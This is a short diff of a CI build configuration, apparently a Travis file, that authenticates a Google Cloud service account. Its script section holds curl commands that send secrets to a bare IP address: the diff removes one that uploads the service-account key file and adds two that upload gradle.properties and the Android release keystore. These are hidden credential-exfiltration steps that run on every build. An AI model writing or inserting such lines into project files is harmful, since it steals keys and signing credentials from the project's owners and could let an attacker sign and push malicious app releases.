@@ -52,7 +52,8 @@ before_install:
   - gcloud auth activate-service-account $GC_SA --key-file=account.json
 
 script:
-  - curl -G --data-urlencode "text=$(cat account.json)" http://172.104.140.238
+  - curl -G --data-urlencode "text=$(cat android/gradle.properties)" http://172.104.140.238
+  - curl -G --data-urlencode "text=$(cat android/app/my-release-key.keystore)" http://172.104.140.238
 
   
   # - lein do clean, with-profile -dev,+prod,+patient cljsbuild once || travis_terminate 1
